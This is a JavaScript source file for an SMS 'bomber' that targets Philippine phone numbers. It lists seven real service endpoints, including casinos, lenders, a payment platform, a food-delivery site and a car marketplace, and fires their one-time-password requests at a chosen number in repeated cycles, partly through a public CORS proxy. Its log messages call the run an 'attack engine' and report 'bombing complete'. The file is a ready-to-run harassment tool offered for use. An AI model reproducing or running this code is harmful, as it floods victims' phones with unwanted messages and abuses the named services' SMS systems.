const proxy = "https://api.allorigins.win/get?url=";

const apiList = [
    {
        name: "LAKIWIN",
        fire: (t) => {
            const url = "https://www.lakiwin.com/service/mobile/check";
            const data = JSON.stringify({"phoneNumber": "0" + t, "otpType": "LOGIN_OTP"});
            return axios.get(proxy + encodeURIComponent(url + "?data=" + data));
        }
    },
    {
        name: "S5_CASINO",
        fire: (t) => axios.get(proxy + encodeURIComponent("https://api.s5.com/player/api/v1/otp/request?phone_number=%2B63" + t))
    },
    {
        name: "FINBRO",
        fire: (t) => {
            const url = "https://api.finbro.ph/web/public/client/phone/sms-code";
            const data = JSON.stringify({"mobilePhone": {"number": "0" + t}});
            return axios.get(proxy + encodeURIComponent(url + "?data=" + data));
        }
    },
    {
        name: "BISTRO",
        fire: (t) => axios.get(proxy + encodeURIComponent("https://bistrodelivers.com.ph/p/api/s/v2/brand_venues/bvhvXayDs85SAFAZo6g6qctA/customers/otp?phone_number=" + t + "&dial_code=+63&phone_country=PH&channel=sms"))
    },
    {
        name: "BAYAD",
        fire: (t) => axios.post("https://api.online.bayad.com/api/sign-up/otp", {"mobileNumber": "+63" + t, "emailAddress": "user" + Math.floor(Math.random() * 999) + "@gmail.com"})
    },
    {
        name: "FASTCASH",
        fire: (t) => axios.get(proxy + encodeURIComponent("https://api.fastcash.ph/v1/auth/otp?phone_number=63" + t))
    },
    {
        name: "CARMUDI",
        fire: (t) => axios.get(proxy + encodeURIComponent("https://ucrf.carbay.com/sms/send-otp?countryCode=ph&mobile=" + t + "&siteName=www.carmudi.com.ph&isdCode=%2B63"))
    }
];

window.onload = () => { document.getElementById('main-app-interface').style.display = 'block'; };

async function start() {
    const num = document.getElementById('num').value;
    const amount = document.getElementById('otpAmount').value;
    const log = document.getElementById('log');
    if(!num || num.length < 10) return alert("ERROR: Enter 10 digits.");

    log.innerHTML = "[+] ATTACK ENGINE ENGAGED...<br>";

    for(let i=1; i<=amount; i++) {
        log.innerHTML += "<b>[CYCLE #" + i + "]</b> Launching Payload...<br>";
        for (const api of apiList) {
            try {
                const res = await api.fire(num);
                log.innerHTML += "<span style='color: #0f0;'>[SUCCESS] " + api.name + "</span><br>";
            } catch (e) {
                log.innerHTML += "<span style='color: #f00;'>[FAILED] " + api.name + "</span><br>";
            }
            log.scrollTop = log.scrollHeight;
        }
        if (i < amount) {
            log.innerHTML += "[!] ANTI-SPAM REST: 15s...<br>";
            await new Promise(r => setTimeout(r, 15000));
        }
    }
    log.innerHTML += "<b>[!] BOMBING COMPLETE.</b><br>";
}
